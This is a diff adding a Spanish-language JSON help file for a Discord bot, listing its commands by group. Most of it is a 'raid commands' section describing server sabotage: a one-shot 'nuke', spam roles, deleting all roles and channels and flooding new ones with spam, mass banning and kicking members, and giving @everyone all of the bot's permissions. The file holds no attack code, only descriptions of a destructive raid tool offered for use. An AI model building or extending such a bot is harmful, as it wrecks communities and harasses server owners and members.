@@ -1,0 +1,27 @@
+{
+
+    "Otros comandos": {
+        "leave": "Hace que el bot se salga de un servior.",
+        "invite": "Invita al bot a algun servidor.",
+        "invitesv": "Crea una invitacion hacia un servidor y te la da."
+    },
+
+    "Comandos de raid": {
+        "nuke": "Ataque total sobre un servidor (Solo un uso).",
+        "croles": "Crea muchos roles de spam.",
+        "droles": "Elimina todos los roles inferiores al del bot.",
+        "massban": "Banea a todos los usuarios que pueda.",
+        "masskick": "Kickea a todos los usuarios que pueda.",
+        "massunban": "Desbanea a todos los usuarios que pueda.",
+        "kill": "Elimina todos los canales que pueda y crea muchos con spam.",
+        "admin": "Crea un rol con todos los permisos que el bot tenga.",
+        "adeveryone": "Le da todos los permisos del bot al rol @everyone."
+    },
+
+    "Comandos de informacion": {
+        "help": "Obten info sobre mis comandos",
+        "info": "Obten info sobre algun servidor",
+        "servers": "Obten una lista de los servidores en los que estoy"
+        
+    }
+}
